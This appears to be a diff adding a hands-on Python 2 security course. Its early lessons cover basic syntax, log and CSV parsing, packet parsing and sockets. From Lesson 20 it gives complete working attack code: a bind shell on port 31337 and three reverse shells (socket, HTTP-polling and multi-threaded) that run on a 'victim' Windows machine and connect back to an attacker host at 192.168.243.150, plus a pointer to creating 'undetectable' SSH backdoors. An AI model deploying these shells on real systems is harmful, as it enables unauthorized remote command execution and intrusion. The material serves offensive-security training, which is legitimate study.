@@ -1,0 +1,3622 @@
+Python Quizzes:
+---------------
+https://www.tutorialspoint.com/python/python_online_quiz.htm
+https://www.geeksforgeeks.org/python-gq/
+https://www.programiz.com/python-programming/quiz
+https://www.afterhoursprogramming.com/tutorial/python/python-quiz/
+https://www.sanfoundry.com/1000-python-questions-answers/
+http://www.mypythonquiz.com/
+http://www.techbeamers.com/python-programming-quiz-for-beginners-part-1/
+
+
+
+
+####################
+# Installing Python#
+####################
+Windows
+32-Bit Version
+http://www.python.org/ftp/python/2.7.5/python-2.7.5.msi
+
+64-Bit Version
+http://www.python.org/ftp/python/2.7.5/python-2.7.5.amd64.msi
+
+After you install Python in Windows the next thing you may want to install is IdleX:
+http://idlex.sourceforge.net/features.html
+
+---------------------------Type This-----------------------------------
+
+Linux
+Debian/Ubuntu:		sudo apt-get install -y python
+RHEL/CentOS/Fedora:	sudo yum install -y python 
+
+-----------------------------------------------------------------------
+
+
+After you install Python in Linux the next thing that you will need to do is install idle. 
+
+---------------------------Type This-----------------------------------
+
+sudo apt-get install -y idle
+
+-----------------------------------------------------------------------
+
+Open IDLE, and let's just dive right in.
+
+
+
+
+######################################
+# Python Lesson   1: Simple Printing #
+######################################
+ 
+---------------------------Type This-----------------------------------
+$ python
+
+>>> print "Today we are learning Python."
+ 
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+##############################################
+# Python Lesson   2: Simple Numbers and Math #
+##############################################
+ 
+---------------------------Type This-----------------------------------
+ 
+>>> 2+2
+ 
+>>> 6-3
+ 
+>>> 18/7
+ 
+>>> 18.0/7
+ 
+>>> 18.0/7.0
+ 
+>>> 18/7
+ 
+>>> 9%4
+ 
+>>> 8%4
+ 
+>>> 8.75%.5
+ 
+>>> 6.*7
+ 
+>>> 6*6*6
+ 
+>>> 6**3
+ 
+>>> 5**12
+ 
+>>> -5**4
+ 
+ 
+-----------------------------------------------------------------------
+ 
+ 
+ 
+################################
+# Python Lesson   3: Variables #
+################################
+ 
+---------------------------Type This-----------------------------------
+ 
+>>> x=18
+ 
+>>> x+15
+ 
+>>> x**3
+ 
+>>> y=54
+ 
+>>> x+y
+ 
+>>> g=input("Enter number here: ")
+    43
+ 
+>>> g+32
+ 
+>>> g**3
+ 
+ 
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+##########################################
+# Python Lesson 4: Modules and Functions #
+##########################################
+ 
+---------------------------Type This-----------------------------------
+ 
+>>> 5**4
+ 
+>>> pow(5,4)
+ 
+>>> abs(-18)
+ 
+>>> abs(5)
+ 
+>>> floor(18.7)
+ 
+>>> import math
+ 
+>>> math.floor(18.7)
+ 
+>>> math.sqrt(81)
+ 
+>>> joe = math.sqrt
+ 
+>>> joe(9)
+ 
+>>> joe=math.floor
+ 
+>>> joe(19.8)
+ 
+ 
+ 
+-----------------------------------------------------------------------
+ 
+ 
+ 
+############################
+# Python Lesson 5: Strings #
+############################
+ 
+---------------------------Type This-----------------------------------
+ 
+ 
+>>> "XSS"
+ 
+>>> 'SQLi'
+ 
+>>> "Joe's a python lover"
+ 
+>>> 'Joe\'s a python lover'
+ 
+>>> "Joe said \"InfoSec is fun\" to me"
+ 
+>>> a = "Joe"
+ 
+>>> b = "McCray"
+ 
+>>> a, b
+ 
+>>> a+b
+ 
+ 
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+#################################
+# Python Lesson 6: More Strings #
+#################################
+ 
+---------------------------Type This-----------------------------------
+ 
+ 
+>>> num = 10
+ 
+>>> num + 2
+ 
+>>> "The number of open ports found on this system is " + num
+ 
+>>> num = str(18)
+ 
+>>> "There are " + num + " vulnerabilities found in this environment."
+ 
+>>> num2 = 46
+ 
+>>> "As of 08/20/2012, the number of states that enacted the Security Breach Notification Law is " + `num2`
+ 
+ 
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+########################################
+# Python Lesson 7: Sequences and Lists #
+########################################
+ 
+---------------------------Type This-----------------------------------
+ 
+>>> attacks = ['Stack Overflow', 'Heap Overflow', 'Integer Overflow', 'SQL Injection', 'Cross-Site Scripting', 'Remote File Include']
+ 
+>>> attacks
+['Stack Overflow', 'Heap Overflow', 'Integer Overflow', 'SQL Injection', 'Cross-Site Scripting', 'Remote File Include']
+ 
+>>> attacks[3]
+'SQL Injection'
+ 
+>>> attacks[-2]
+'Cross-Site Scripting'
+
+>>> exit()
+ 
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+##################################
+# Level 8: Intro to Log Analysis #
+##################################
+ 
+ 
+Log into your Linux host then execute the following commands:
+-----------------------------------------------------------------------
+NOTE: If you are still in your python interpreter then you must type exit() to get back to a regular command-prompt.
+
+
+ 
+---------------------------Type This-----------------------------------
+ 
+wget http://pastebin.com/raw/85zZ5TZX
+ 
+mv 85zZ5TZX access_log
+ 
+ 
+cat access_log | grep 141.101.80.188
+ 
+cat access_log | grep 141.101.80.187
+ 
+cat access_log | grep 108.162.216.204
+ 
+cat access_log | grep 173.245.53.160
+ 
+----------------------------------------------------------------------
+ 
+
+
+
+
+Google the following terms:
+    - Python read file
+    - Python read line
+    - Python read from file
+ 
+ 
+ 
+ 
+###############################################################
+# Python Lesson 9: Use Python to read in a file line by line  #
+###############################################################
+ 
+ 
+Reference:
+http://cmdlinetips.com/2011/08/three-ways-to-read-a-text-file-line-by-line-in-python/
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+ 
+nano logread1.py
+ 
+ 
+---------------------------Paste This-----------------------------------
+## Open the file with read only permit
+f = open('access_log', "r")
+ 
+## use readlines to read all lines in the file
+## The variable "lines" is a list containing all lines
+lines = f.readlines()
+ 
+print lines
+ 
+ 
+## close the file after reading the lines.
+f.close()
+ 
+----------------------------------------------------------------------
+
+
+
+
+---------------------------Type This-----------------------------------
+python logread1.py
+----------------------------------------------------------------------
+
+ 
+ 
+Google the following:
+    - python difference between readlines and readline
+    - python readlines and readline
+ 
+ 
+ 
+
+
+
+ 
+ 
+########################################
+#Python Lesson   10: A quick challenge #
+########################################
+ 
+Can you write an if/then statement that looks for this IP and print the log file line that contains the IP address?
+ 
+ 
+141.101.81.187
+ 
+ 
+ 
+ 
+ 
+ 
+---------------------------------------------------------
+Hint 1: Use Python to look for a value in a list
+ 
+Reference:
+http://www.wellho.net/mouth/1789_Looking-for-a-value-in-a-list-Python.html
+ 
+ 
+ 
+ 
+---------------------------------------------------------
+Hint 2: Use Python to prompt for user input
+ 
+Reference:
+http://www.cyberciti.biz/faq/python-raw_input-examples/
+ 
+ 
+ 
+ 
+---------------------------------------------------------
+Hint 3: Use Python to search for a string in a list
+ 
+Reference:
+http://stackoverflow.com/questions/4843158/check-if-a-python-list-item-contains-a-string-inside-another-string
+ 
+ 
+ 
+ 
+ 
+Here is my solution:
+ 
+---------------------------Type This-----------------------------------
+ 
+$ python
+>>> f = open('access_log', "r")
+>>> lines = f.readlines()
+>>> ip = '141.101.81.187'
+>>> for string in lines:
+...     if ip in string:
+...             print(string)
+ 
+----------------------------------------------------------------------
+ 
+ 
+Here is one student's solution - can you please explain each line of this code to me?
+ 
+ 
+---------------------------Type This-----------------------------------
+exit()
+nano ip_search.py
+ 
+---------------------------Paste This-----------------------------------
+#!/usr/bin/python
+ 
+f = open('access_log')
+ 
+strUsrinput = raw_input("Enter IP Address: ")
+ 
+for line in iter(f):
+    ip = line.split(" - ")[0]
+    if ip == strUsrinput:
+        print line
+ 
+f.close()
+ 
+----------------------------------------------------------------------
+
+
+
+
+---------------------------Type This-----------------------------------
+python ip_search.py
+----------------------------------------------------------------------
+
+
+
+
+ 
+ 
+ 
+ 
+Working with another student after class we came up with another solution:
+ 
+---------------------------Type This-----------------------------------
+nano ip_search2.py
+ 
+---------------------------Paste This-----------------------------------
+#!/usr/bin/env python
+ 
+ 
+# This line opens the log file
+f=open('access_log',"r")
+ 
+# This line takes each line in the log file and stores it as an element in the list
+lines = f.readlines()
+ 
+ 
+# This lines stores the IP that the user types as a var called userinput
+userinput = raw_input("Enter the IP you want to search for: ")
+ 
+ 
+ 
+# This combination for loop and nested if statement looks for the IP in the list called lines and prints the entire line if found.
+for ip in lines:
+    if ip.find(userinput) != -1:
+        print ip
+ 
+----------------------------------------------------------------------
+ 
+
+
+---------------------------Type This-----------------------------------
+python ip_search2.py
+----------------------------------------------------------------------
+
+
+#################################################
+# Lesson 14: Look for web attacks in a log file #
+#################################################
+
+In this lab we will be looking at the scan_log.py script and it will scan the server log to find out common hack attempts within your web server log.
+Supported attacks:
+1.	    SQL Injection
+2.	    Local File Inclusion
+3.	    Remote File Inclusion
+4.	    Cross-Site Scripting
+
+
+---------------------------Type This-----------------------------------
+
+wget https://s3.amazonaws.com/infosecaddictsfiles/scan_log.py
+
+----------------------------------------------------------------------
+
+The usage for scan_log.py is simple.  You feed it an apache log file.
+
+---------------------------Type This-----------------------------------
+
+cat scan_log.py | less			(use your up/down arrow keys to look through the file)
+
+----------------------------------------------------------------------
+
+Explain to me how this script works.
+
+
+
+################################
+# Lesson 15: Parsing CSV Files #
+################################
+
+Dealing with csv files
+
+Reference:
+http://www.pythonforbeginners.com/systems-programming/using-the-csv-module-in-python/
+
+Type the following commands:
+---------------------------------------------------------------------------------------------------------
+
+---------------------------Type This-----------------------------------
+
+wget https://s3.amazonaws.com/infosecaddictsfiles/class_nessus.csv
+
+----------------------------------------------------------------------
+
+Example 1 - Reading CSV files
+-----------------------------
+#To be able to read csv formated files, we will first have to import the
+#csv module.
+
+
+---------------------------Type This-----------------------------------
+python
+import csv
+with open('class_nessus.csv', 'rb') as f:
+    reader = csv.reader(f)
+    for row in reader:
+        print row
+
+
+----------------------------------------------------------------------
+
+
+
+
+Example 2 - Reading CSV files
+-----------------------------
+
+---------------------------Type This-----------------------------------
+
+vi readcsv.py
+
+---------------------------Paste This-----------------------------------
+#!/usr/bin/python
+import csv     				# imports the csv module
+import sys      			# imports the sys module
+
+f = open(sys.argv[1], 'rb') 		# opens the csv file
+try:
+    reader = csv.reader(f)  		# creates the reader object
+    for row in reader:   		# iterates the rows of the file in orders
+        print row    			# prints each row
+finally:
+    f.close()      			# closing
+
+
+
+----------------------------------------------------------------------
+
+
+
+Ok, now let's run this thing.
+
+--------------------------Type This-----------------------------------
+python readcsv.py 
+
+python readcsv.py class_nessus.csv 
+----------------------------------------------------------------------
+
+
+
+
+
+Example 3 - - Reading CSV files
+-------------------------------
+
+---------------------------Type This-----------------------------------
+
+vi readcsv2.py
+
+---------------------------Paste This-----------------------------------
+#!/usr/bin/python
+# This program will then read it and displays its contents.
+
+
+import csv
+
+ifile  = open('class_nessus.csv', "rb")
+reader = csv.reader(ifile)
+
+rownum = 0
+for row in reader:
+    # Save header row.
+    if rownum == 0:
+        header = row
+    else:
+        colnum = 0
+        for col in row:
+            print '%-8s: %s' % (header[colnum], col)
+            colnum += 1
+            
+    rownum += 1
+
+ifile.close()
+
+
+----------------------------------------------------------------------
+
+
+
+---------------------------Type This-----------------------------------
+
+python readcsv2.py | less
+
+
+----------------------------------------------------------------------
+
+
+
+
+
+/---------------------------------------------------/    
+--------------------PARSING CSV FILES----------------
+/---------------------------------------------------/
+
+-------------TASK 1------------
+
+---------------------------Type This-----------------------------------
+
+vi readcsv3.py
+
+---------------------------Paste This-----------------------------------
+#!/usr/bin/python
+import csv
+f = open('class_nessus.csv', 'rb')
+try:
+    rownum = 0
+    reader = csv.reader(f)
+    for row in reader:
+         #Save header row.
+        if rownum == 0:
+            header = row
+        else:
+            colnum = 0
+            if row[3].lower() == 'high':
+                print '%-1s: %s     %-1s: %s     %-1s: %s     %-1s: %s' % (header[3], row[3],header[4], row[4],header[5], row[5],header[6], row[6])
+        rownum += 1
+finally:
+    f.close()
+
+-----------------------------------------------------------------------
+
+
+---------------------------Type This-----------------------------------
+
+python readcsv3.py | less
+-----------------------------------------------------------------------
+
+-------------TASK 2------------
+
+---------------------------Type This-----------------------------------
+
+vi readcsv4.py
+-----------------------------------------------------------------------
+
+---------------------------Paste This-----------------------------------
+
+#!/usr/bin/python
+import csv
+f = open('class_nessus.csv', 'rb')
+try:
+    print '/---------------------------------------------------/'
+    rownum = 0
+    hosts = {}
+    reader = csv.reader(f)
+    for row in reader:
+        # Save header row.
+        if rownum == 0:
+            header = row
+        else:
+            colnum = 0
+            if row[3].lower() == 'high' and row[4] not in hosts:
+                hosts[row[4]] = row[4]
+                print '%-1s: %s     %-1s: %s     %-1s: %s     %-1s: %s' % (header[3], row[3],header[4], row[4],header[5], row[5],header[6], row[6])
+        rownum += 1
+finally:
+    f.close()
+
+
+python readcsv4.py | less
+
+----------------------------------------------------------------------
+
+
+
+
+
+
+
+
+#################################################
+# Lesson 16: Parsing Packets with Python's DPKT #
+#################################################
+The first thing that you will need to do is install dpkt. 
+
+---------------------------Type This-----------------------------------
+
+
+sudo apt-get install -y python-dpkt
+
+----------------------------------------------------------------------
+
+
+
+Now cd to your courseware directory, and the cd into the subfolder '2-PCAP-Parsing/Resources'. 
+Run tcpdump to capture a .pcap file that we will use for the next exercise
+
+---------------------------Type This-----------------------------------
+
+sudo tcpdump -ni eth0 -s0 -w quick.pcap
+
+----------------------------------------------------------------------
+
+--open another command prompt--
+
+---------------------------Type This-----------------------------------
+
+
+wget http://packetlife.net/media/library/12/tcpdump.pdf
+
+----------------------------------------------------------------------
+
+Let's do something simple:
+
+---------------------------Type This-----------------------------------
+
+
+vi quickpcap.py
+
+---------------------------Paste This-----------------------------------
+
+#!/usr/bin/python
+import dpkt;
+
+# Simple script to read the timestamps in a pcap file
+# Reference: http://superbabyfeng.blogspot.com/2009/05/dpkt-tutorial-0-simple-example-how-to.html
+
+f = open("quick.pcap","rb")
+pcap = dpkt.pcap.Reader(f)
+
+for ts, buf in pcap:
+	print ts;
+
+f.close();
+
+
+----------------------------------------------------------------------
+
+
+Now let's run the script we just wrote
+
+---------------------------Type This-----------------------------------
+
+python quickpcap.py
+
+----------------------------------------------------------------------
+
+
+
+How dpkt breaks down a packet:
+
+Reference:
+http://superbabyfeng.blogspot.com/2009/05/dpkt-tutorial-1-dpkt-sub-modules.html
+
+    src: the MAC address of SOURCE.
+    dst: The MAC address of DESTINATION
+    type: The protocol type of contained ethernet payload.
+
+The allowed values are listed in the file "ethernet.py",
+such as:
+a) ETH_TYPE_IP: It means that the ethernet payload is IP layer data.
+b) ETH_TYPE_IPX: Means that the ethernet payload is IPX layer data.
+
+
+References:
+http://stackoverflow.com/questions/6337878/parsing-pcap-files-with-dpkt-python
+
+
+
+
+
+
+Ok - now let's have a look at pcapparsing.py
+
+---------------------------Type This-----------------------------------
+
+
+sudo tcpdump -ni eth0 -s0 -w capture-100.pcap
+
+----------------------------------------------------------------------
+
+--open another command prompt--
+
+---------------------------Type This-----------------------------------
+
+
+wget http://packetlife.net/media/library/13/Wireshark_Display_Filters.pdf
+
+----------------------------------------------------------------------
+
+
+Ok - now let's have a look at pcapparsing.py
+
+
+--------------------------------------------------------------
+
+
+import socket
+import dpkt
+import sys
+f = open('capture-100.pcap','r')
+pcapReader = dpkt.pcap.Reader(f)
+
+for ts,data in pcapReader:
+    ether = dpkt.ethernet.Ethernet(data)
+    if ether.type != dpkt.ethernet.ETH_TYPE_IP: raise
+    ip = ether.data
+    tcp = ip.data
+    src = socket.inet_ntoa(ip.src)
+    srcport = tcp.sport
+    dst = socket.inet_ntoa(ip.dst)
+    dstport = tcp.dport
+    print "src: %s (port : %s)-> dest: %s (port %s)" % (src,srcport ,dst,dstport)
+
+f.close()
+
+----------------------------------------------------------------------
+
+
+
+OK - let's run it:
+
+---------------------------Type This-----------------------------------
+
+python pcapparsing.py
+
+----------------------------------------------------------------------
+
+
+running this script might throw an error like this:
+
+Traceback (most recent call last):
+  File "pcapparsing.py", line 9, in <module>
+    if ether.type != dpkt.ethernet.ETH_TYPE_IP: raise
+
+
+If it does it is just because your packet has something in it that we didn't specify (maybe ICMP, or something)
+
+
+
+
+Your homework for today...
+
+
+Rewrite this pcapparsing.py so that it prints out the timestamp, the source and destination IP addresses, and the source and destination ports.
+
+
+
+
+
+
+Your challenge is to fix the Traceback error
+
+---------------------------Paste This-----------------------------------
+
+#!/usr/bin/python
+
+import pcapy
+import dpkt
+import sys
+import socket
+import struct
+
+SINGLE_SHOT = False
+
+# list all the network devices
+pcapy.findalldevs()
+
+iface = "eth0"
+filter = "arp"
+max_bytes = 1024
+promiscuous = False
+read_timeout = 100 # in milliseconds
+
+pc = pcapy.open_live( iface, max_bytes, promiscuous, read_timeout )
+pc.setfilter( filter )
+
+# callback for received packets
+def recv_pkts( hdr, data ):
+    packet = dpkt.ethernet.Ethernet( data )
+
+    print type( packet.data )
+    print "ipsrc: %s, ipdst: %s" %( \
+                 socket.inet_ntoa( packet.data.spa ), \
+                 socket.inet_ntoa( packet.data.tpa ) )
+
+    print "macsrc: %s, macdst: %s " % (
+                "%x:%x:%x:%x:%x:%x" % struct.unpack("BBBBBB",packet.data.sha),
+                "%x:%x:%x:%x:%x:%x" % struct.unpack("BBBBBB",packet.data.tha ) )
+
+if SINGLE_SHOT:
+    header, data = pc.next()
+    sys.exit(0)
+else:
+    packet_limit = -1 # infinite
+    pc.loop( packet_limit, recv_pkts ) # capture packets
+
+----------------------------------------------------------------------
+
+Rewrite this pcapparsing.py so that it prints out the timestamp, the source and destination IP addresses, and the source and destination ports.
+
+Running the current version of the script may give you an error like this:
+
+Traceback (most recent call last):
+  File "pcapparsing.py", line 9, in <module>
+    if ether.type != dpkt.ethernet.ETH_TYPE_IP: raise
+
+
+If it does it is just because your packet has something in it that we didn't specify (maybe ICMP, or something)
+
+Your challenge task is to fix the Traceback error
+
+#############################################
+# Lesson 17: Python Sockets & Port Scanning #
+#############################################
+
+---------------------------Type This-----------------------------------
+
+$ sudo /sbin/iptables -F
+
+$ ncat -l -v -p 1234
+
+----------------------------------------------------------------------
+
+
+
+--open another terminal--
+
+---------------------------Type This-----------------------------------
+
+python
+
+>>> import socket
+>>> s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+>>> s.connect(('localhost', 1234))
+>>> s.send('Hello, world')
+>>> data = s.recv(1024)
+>>> s.close()
+
+>>> print 'Received', data
+
+
+----------------------------------------------------------------------
+
+
+
+
+########################################
+# Lesson 18: TCP Client and TCP Server #
+########################################
+
+---------------------------Type This-----------------------------------
+
+
+vi tcpclient.py
+
+---------------------------Paste This-----------------------------------
+
+
+#!/usr/bin/python
+# tcpclient.py
+
+import socket
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+hostport = ("127.0.0.1", 1337)
+s.connect(hostport)
+s.send("Hello\n")
+buf = s.recv(1024)
+print "Received", buf
+
+
+
+----------------------------------------------------------------------
+
+
+---------------------------Type This-----------------------------------
+
+
+
+
+vi tcpserver.py
+
+
+---------------------------Paste This-----------------------------------
+
+
+#!/usr/bin/python
+# tcpserver.py
+
+import socket
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+hostport = ("", 1337)
+s.bind(hostport)
+s.listen(10)
+while 1:
+	cli,addr = s.accept()
+	print "Connection from", addr
+	buf = cli.recv(1024)
+	print "Received", buf
+	if buf == "Hello\n":
+		cli.send("Server ID 1\n")
+	cli.close()
+
+
+
+
+----------------------------------------------------------------------
+
+
+---------------------------Type This-----------------------------------
+
+
+python tcpserver.py
+
+
+--open another terminal--
+python tcpclient.py
+
+----------------------------------------------------------------------
+
+########################################
+# Lesson 19: UDP Client and UDP Server #
+########################################
+
+---------------------------Type This-----------------------------------
+
+vi udpclient.py
+
+
+
+---------------------------Paste This-----------------------------------
+
+
+
+#!/usr/bin/python
+# udpclient.py
+
+import socket
+
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+hostport = ("127.0.0.1", 1337)
+s.sendto("Hello\n", hostport)
+buf = s.recv(1024)
+print buf
+
+
+
+----------------------------------------------------------------------
+
+
+
+
+---------------------------Type This-----------------------------------
+
+
+vi udpserver.py
+
+
+---------------------------Paste This-----------------------------------
+
+
+
+
+#!/usr/bin/python
+# udpserver.py
+
+import socket
+
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+hostport = ("127.0.0.1", 1337)
+s.bind(hostport)
+while 1:
+	buf, address = s.recvfrom(1024)
+	print buf
+	if buf == "Hello\n":
+		s.sendto("Server ID 1\n", address)
+
+
+----------------------------------------------------------------------
+
+
+---------------------------Type This-----------------------------------
+
+
+python udpserver.py
+
+
+--open another terminal--
+python udpclient.py
+
+----------------------------------------------------------------------
+
+
+######################################
+# Lesson 20: Bind and Reverse Shells #
+######################################
+
+---------------------------Type This-----------------------------------
+
+
+vi simplebindshell.py
+
+---------------------------Paste This-----------------------------------
+
+#!/bin/python
+import os,sys,socket
+
+ls = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+print '-Creating socket..'
+port = 31337
+try:
+	ls.bind(('', port))
+	print '-Binding the port on ' 
+	ls.listen(1)
+	print '-Listening, '
+	(conn, addr) = ls.accept()
+	print '-Waiting for connection...'
+	cli= conn.fileno()
+	print '-Redirecting shell...'
+	os.dup2(cli, 0)
+	print 'In, '
+	os.dup2(cli, 1)
+	print 'Out, '
+	os.dup2(cli, 2)
+	print 'Err'	
+	print 'Done!'
+	arg0='/bin/sh'
+	arg1='-a'
+	args=[arg0]+[arg1]
+	os.execv(arg0, args)
+except(socket.error):
+	print 'fail\n'
+	conn.close()
+	sys.exit(1)
+
+----------------------------------------------------------------------
+
+
+
+---------------------------Type This-----------------------------------
+
+nc TARGETIP 31337
+
+----------------------------------------------------------------------
+
+
+---------------------
+Preparing the target for a reverse shell
+
+---------------------------Type This-----------------------------------
+
+$ ncat -lvp 4444
+
+--open another terminal--
+wget https://www.trustedsec.com/files/simple_py_shell.py
+
+vi simple_py_shell.py
+
+
+
+----------------------------------------------------------------------
+
+
+
+-------------------------------
+Tricky shells
+
+Reference:
+http://securityweekly.com/2011/10/python-one-line-shell-code.html
+http://resources.infosecinstitute.com/creating-undetectable-custom-ssh-backdoor-python-z/
+
+
+
+
+###############################
+# Reverse Shell in Python 2.7 #
+###############################
+
+We'll create 2 python files. One for the server and one for the client.
+
+- Below is the python code that is running on victim/client Windows machine:
+
+---------------------------Paste This-----------------------------------
+
+# Client
+
+import socket # For Building TCP Connection
+import subprocess # To start the shell in the system
+
+def connect():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(('192.168.243.150',8080))
+
+    while True:                         #keep receiving commands
+        command = s.recv(1024)
+
+        if 'terminate' in command:
+            s.close() #close the socket
+            break
+
+        else:
+
+            CMD = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            s.send( CMD.stdout.read()  )  # send the result
+            s.send( CMD.stderr.read()  )  # incase you mistyped a command.
+            # we will send back the error
+
+def main ():
+    connect()
+main()
+
+
+----------------------------------------------------------------------
+
+- Below is the code that we should run on server unit, in our case InfosecAddicts Ubuntu machine ( Ubuntu IP: 192.168.243.150 )
+
+---------------------------Paste This-----------------------------------
+
+# Server
+
+import socket # For Building TCP Connection
+
+
+def connect ():
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind(("192.168.243.150", 8080))
+    s.listen(1)
+    conn, addr = s.accept()
+    print '[+] We got a connection from:  ', addr
+
+
+    while True:
+         command = raw_input("Shell> ")
+
+         if 'terminate' in command:
+             conn.send('termminate')
+             conn.close()  # close the connection with host
+             break
+
+         else:
+             conn.send(command)   #send command
+             print conn.recv(1024)
+
+def main ():
+    connect()
+main()
+
+----------------------------------------------------------------------
+
+- First run server.py code from Ubuntu machine. From command line type:
+
+---------------------------Type This-----------------------------------
+
+python server.py
+
+----------------------------------------------------------------------
+
+- then check if 8080 port is open, and if we are listening on 8080:
+
+---------------------------Type This-----------------------------------
+
+netstat -antp | grep "8080"
+
+----------------------------------------------------------------------
+
+- Then on victim ( Windows ) unit run client.py code.
+
+
+- Connection will be established, and you will get a shell on Ubuntu:
+
+---------------------------Type This-----------------------------------
+
+infosecaddicts@ubuntu:~$ python server.py
+[+] We got a connection from:   ('192.168.243.1', 56880)
+Shell> arp -a
+
+Shell> ipconfig
+
+Shell> dir
+----------------------------------------------------------------------
+
+
+##########################################
+# HTTP based reverse shell in Python 2.7 #
+##########################################
+
+
+- The easiest way to install python modules and keep them up-to-date is with a Python-based package manager called Pip
+- Download get-pip.py from https://bootstrap.pypa.io/get-pip.py on your Windows machine
+
+Then run python get-pip.py from command line. Once pip is installed you may use it to install packages.
+
+- Install requests package:
+---------------------------Type This-----------------------------------
+
+     python -m pip install requests
+
+----------------------------------------------------------------------
+
+- Copy and paste below code into client_http.py on your Windows machine:
+
+- In my case server/ubuntu IP is 192.168.243.150. You need to change IP to your server address, in both codes (client_http.py, server_HTTP.py)
+
+---------------------------Paste This-----------------------------------
+# Client
+
+import requests
+import subprocess
+import time
+
+
+while True:
+    req = requests.get('http://192.168.243.150')
+    command = req.text
+
+    if 'terminate' in command:
+        break
+
+    else:
+        CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        post_response = requests.post(url='http://192.168.243.150', data=CMD.stdout.read() )
+        post_response = requests.post(url='http://192.168.243.150', data=CMD.stderr.read() )
+
+    time.sleep(3)
+
+
+
+
+----------------------------------------------------------------------
+
+
+
+- Copy and paste below code into server_HTTP.py on your Ubuntu unit (server):
+
+
+---------------------------Paste This-----------------------------------
+
+import BaseHTTPServer
+HOST_NAME = '192.168.243.150'
+PORT_NUMBER = 80
+class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
+
+    def do_GET(s):
+        command = raw_input("Shell> ")
+        s.send_response(200)
+        s.send_header("Content-type", "text/html")
+        s.end_headers()
+        s.wfile.write(command)
+
+
+    def do_POST(s):
+        s.send_response(200)
+        s.end_headers()
+        length = int(s.headers['Content-Length'])
+        postVar = s.rfile.read(length)
+        print postVar
+
+if __name__ == '__main__':
+    server_class = BaseHTTPServer.HTTPServer
+    httpd = server_class((HOST_NAME, PORT_NUMBER), MyHandler)
+
+    try:
+        httpd.serve_forever()                            
+    except KeyboardInterrupt:
+        print'[!] Server is terminated'
+        httpd.server_close()
+
+----------------------------------------------------------------------
+
+- run server_HTTP.py on Ubuntu with next command:
+
+---------------------------Type This-----------------------------------
+
+infosecaddicts@ubuntu:~$ sudo python server_HTTP.py
+
+----------------------------------------------------------------------
+
+
+- on Windows machine run client_http.py
+
+- on Ubuntu you will see that connection is established:
+
+---------------------------Type This-----------------------------------
+
+infosecaddicts@ubuntu:~$ sudo python server_HTTP.py
+Shell> dir
+----------------------------------------------------------------------
+
+192.168.243.1 - - [25/Sep/2017 12:21:40] "GET / HTTP/1.1" 200 -
+192.168.243.1 - - [25/Sep/2017 12:21:40] "POST / HTTP/1.1" 200 -
+ Volume in drive C has no label.
+
+
+############################################
+# Multi-Threaded Reverse Shell in Python 3 #
+############################################
+
+
+- We'll again create 2 files, one for server and one for client/victim. This code is adjusted to work on python2.7
+
+Copy and paste code from below into server.py file on Ubuntu(server) machine and run it with command python server.py:
+
+
+Server.py code:
+---------------------------Paste This-----------------------------------
+
+import socket
+import sys
+
+# Create socket (allows two computers to connect)
+
+def socket_create():
+    try:
+        global host
+        global port
+        global s
+        host = ''
+        port = 9999
+        s = socket.socket()
+    except socket.error as msg:
+        print("Socket creation error: " + str(msg))
+        
+# Bind socket to port and wait for connection from client
+def socket_bind():
+    try:
+        global host
+        global port
+        global s
+        print("Binding socket to port: " + str(port))
+        s.bind((host,port))
+        s.listen(5)
+    except socket.error as msg:
+        print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
+        socket_bind()
+
+# Establish a connection with client (socket must be listening for them)
+def socket_accept():
+    conn, address = s.accept()
+    print("Connection has been established | " + "IP " + address[0] + " | Port " + str(address[1]))
+    send_commands(conn)
+    conn.close()
+
+
+# Send commands    
+def send_commands(conn):
+    while True:
+        cmd = raw_input()                          #input() is changed to raw_input() in order to work on python2.7
+        if cmd == 'quit':
+            conn.close()
+            s.close()
+            sys.exit()
+        if len(str.encode(cmd))>0:
+            conn.send(str.encode(cmd))
+            client_response = str(conn.recv(1024))  # had issue with encoding and I have removed utf-8 from client_response = str(conn.recv(1024),"utf-8")
+            print(client_response)
+
+# References for str.encode/decode
+# https://www.tutorialspoint.com/python/string_encode.htm
+# https://www.tutorialspoint.com/python/string_decode.htm
+
+
+def main():
+    socket_create()
+    socket_bind()
+    socket_accept()
+
+main()
+
+
+    
+----------------------------------------------------------------------
+
+
+-After you have aleady run server.py on Ubuntu, you can then run client.py file from Windows(client) unit. Code is below:
+
+Client.py code:
+
+---------------------------Paste This-----------------------------------
+
+import os
+import socket
+import subprocess
+
+s = socket.socket()
+host = '192.168.243.150'    # change to IP address of your server
+port = 9999
+s.connect((host, port))
+
+while True:
+    data = s.recv(1024)
+    if data[:2].decode("utf-8") == 'cd':
+        os.chdir(data[3:].decode("utf-8"))
+    if len(data) > 0:
+        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        output_bytes = cmd.stdout.read() + cmd.stderr.read()
+        output_str = str(output_bytes)                         # had issue with encoding, in origin code is output_str = str(output_bytes, "utf-8")
+        s.send(str.encode(output_str + str(os.getcwd()) + '> '))
+        print(output_str)
+# References for str.encode/decode
+# https://www.tutorialspoint.com/python/string_encode.htm
+# https://www.tutorialspoint.com/python/string_decode.htm
+        
+# Close connection
+s.close()
+
+
+----------------------------------------------------------------------
+
+---------------------------Type This-----------------------------------
+
+python client.py
+----------------------------------------------------------------------
+
+- Then return back to Ubuntu and you will see that connection is established and you can run commands from shell.
+
+---------------------------Type This-----------------------------------
